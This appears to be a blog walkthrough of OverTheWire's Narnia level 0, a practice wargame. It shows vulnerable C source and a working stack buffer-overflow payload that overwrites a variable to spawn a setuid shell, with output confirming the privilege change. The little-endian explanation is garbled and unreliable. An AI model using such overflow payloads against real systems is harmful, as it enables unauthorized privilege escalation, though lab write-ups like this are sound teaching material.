# Narnia Binary-Exploitation Level 0

Greetings to the best hacker in the world. Welcome back to my blog about binary-exploitation. Today I am going to walkthrough *Narnia* overthewire challenge. I hope
you will like, and share my blogs with your friends. Let's dive into it.

Narnia is a wargame that has been rescued from the demise of intruded.net, previously hosted on narnia.intruded.net. Big thanks to adc, morla and reth for their help in resurrecting this game.


```
Difficulty 2/10
Levels 10
Platform Linux/x86

```


## Level 0

We need to log in so as to perfom our exploitation task. 

```bash
ssh narnia0@narnia.labs.overthewire.org -p 2226
Username: narnia0
Password: narnia0

```

After logging into the system, you should be able to see these files :


```bash
narnia0@gibson:/narnia$ ls -la
total 160
drwxr-xr-x  2 root    root     4096 Dec  3 08:14 .
drwxr-xr-x 25 root    root     4096 Dec 28 18:00 ..
-r-sr-x---  1 narnia1 narnia0 15032 Dec  3 08:14 narnia0
-r--r-----  1 narnia0 narnia0  1229 Dec  3 08:14 narnia0.c
-r-sr-x---  1 narnia2 narnia1 14872 Dec  3 08:14 narnia1
-r--r-----  1 narnia1 narnia1  1021 Dec  3 08:14 narnia1.c
-r-sr-x---  1 narnia3 narnia2 11236 Dec  3 08:14 narnia2
-r--r-----  1 narnia2 narnia2  1022 Dec  3 08:14 narnia2.c
-r-sr-x---  1 narnia4 narnia3 11472 Dec  3 08:14 narnia3
-r--r-----  1 narnia3 narnia3  1699 Dec  3 08:14 narnia3.c
-r-sr-x---  1 narnia5 narnia4 11264 Dec  3 08:14 narnia4
-r--r-----  1 narnia4 narnia4  1080 Dec  3 08:14 narnia4.c
-r-sr-x---  1 narnia6 narnia5 11468 Dec  3 08:14 narnia5
-r--r-----  1 narnia5 narnia5  1262 Dec  3 08:14 narnia5.c
-r-sr-x---  1 narnia7 narnia6 11520 Dec  3 08:14 narnia6
-r--r-----  1 narnia6 narnia6  1602 Dec  3 08:14 narnia6.c
-r-sr-x---  1 narnia8 narnia7 11988 Dec  3 08:14 narnia7
-r--r-----  1 narnia7 narnia7  1964 Dec  3 08:14 narnia7.c
-r-sr-x---  1 narnia9 narnia8 11272 Dec  3 08:14 narnia8
-r--r-----  1 narnia8 narnia8  1269 Dec  3 08:14 narnia8.c

```

I am going to look at the source code of level-0 to have to have better understanding what the file does.

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;

```

In order to solve this challenge we should to change the value `0x41414141` to be `0xdeadbeef`. There is a security issue by *scanf()* because `buf[20]` is initialized
to 20 characters however, we are now able to add 4 more characters, which allows us to buffer the flow. I am willing to use python to splash 24 characters.


```python
narnia0@gibson:/narnia$ python3 -c "print(20*'A' + 'BBBB')" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!

```
Awesome it seems to work. We will be able to modidy `BBBB` to be `little endian`.

Little-Endian: An argument for little endian order is that as you increase a numeric value, you may need to add digits to the left. For example, a higher non-exponential number
has more digits. Thus, an addition of two numbers all the digits of a big endian ordered number in storage.


Let's change it.

```bash
narnia0@gibson:/narnia$ (echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde";cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1

```
First we need to figure out how to get hex into our ASCII input. The BASH shell has the ability to represent hex using the \x escape sequence, 
but in order for echo to parse escape sequence we have to add the -e option. I actually struggled a bit with this one, because it did not pop the shell. After a while researching
, i recognized that it was depreciated so we should add `;cat;` to run another command after the first command. We can go over to level 1.





